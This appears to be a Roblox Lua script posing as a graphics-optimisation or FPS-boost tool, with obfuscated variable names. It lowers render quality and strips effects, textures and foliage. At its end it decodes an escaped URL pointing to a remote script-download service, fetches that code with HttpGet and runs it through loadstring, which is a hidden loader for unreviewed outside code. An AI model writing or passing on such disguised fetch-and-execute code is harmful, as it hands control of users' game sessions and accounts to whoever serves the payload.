local _0x1a = game:GetService("Players")
local _0x2b = game:GetService("Lighting")
local _0x3c = workspace:FindFirstChildOfClass("Terrain")

settings().Rendering.QualityLevel = Enum.QualityLevel.Level0
_0x2b.GlobalShadows = false
_0x2b.Brightness = 2
_0x2b.FogEnd = 999999

for _, _0x4d in pairs(_0x2b:GetChildren()) do
    if _0x4d:IsA("PostEffect") or _0x4d:IsA("Sky") then
        _0x4d:Destroy()
    end
end

if _0x3c then
    _0x3c.WaterWaveSize = 0
    _0x3c.WaterWaveSpeed = 0
    _0x3c.WaterReflectance = 0
    _0x3c.WaterTransparency = 0
end

local function _0x5e(_0x6f)
    if _0x6f:IsA("BasePart") then
        _0x6f.Material = Enum.Material.SmoothPlastic
        _0x6f.Reflectance = 0
        _0x6f.CastShadow = false
    elseif _0x6f:IsA("Decal") or _0x6f:IsA("Texture") then
        _0x6f:Destroy()
    elseif _0x6f:IsA("ParticleEmitter") or _0x6f:IsA("Trail") or _0x6f:IsA("Fire") or _0x6f:IsA("Smoke") or _0x6f:IsA("Sparkles") then
        _0x6f:Destroy()
    end
end

for _, _0x70 in pairs(workspace:GetDescendants()) do
    _0x5e(_0x70)
    if _0x70:IsA("Model") then
        local _0x81 = _0x70.Name:lower()
        if _0x81:find("tree") or _0x81:find("plant") or _0x81:find("grass") or _0x81:find("leaves") or _0x81:find("bush") or _0x81:find("flower") or _0x81:find("prop") then
            _0x70:Destroy()
        end
    end
end

workspace.DescendantAdded:Connect(function(_0x92)
    _0x5e(_0x92)
end)

local _0x9a = {
    "\104\116\116\112\115\58\47\47\97\112\105\46\106\110\107\105\101\46\99\111\109\47\97\112\105\47\118\49\47\108\117\97\115\99\114\105\112\116\115\47\112\117\98\108\105\99\47\102\99\100\49\50\102\51\102\98\102\53\56\56\102\56\101\56\55\100\50\99\97\52\56\98\99\56\51\53\52\50\101\57\54\54\54\100\48\53\50\100\51\55\102\54\49\50\101\97\55\102\98\54\48\54\50\52\97\98\48\100\102\47\100\111\119\110\108\111\97\100"
}

local _0xab = ""
for _, _0xbc in ipairs(_0x9a) do
    _0xab = _0xab .. _0xbc
end

loadstring(game:HttpGet(_0xab))()
